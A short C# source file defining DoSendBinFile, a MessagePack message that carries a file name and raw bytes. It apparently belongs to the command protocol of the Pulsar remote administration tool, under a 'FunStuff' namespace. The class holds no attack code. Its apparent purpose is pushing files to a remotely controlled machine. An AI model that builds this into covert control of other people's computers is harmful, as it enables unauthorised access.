using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.FunStuff
{
    [MessagePackObject]
    public class DoSendBinFile : IMessage
    {
        [Key(0)]
        public string FileName { get; set; }

        [Key(1)]
        public byte[] Data { get; set; }

        public DoSendBinFile() { }

        public DoSendBinFile(string fileName, byte[] data)
        {
            FileName = fileName;
            Data = data;
        }
    }
}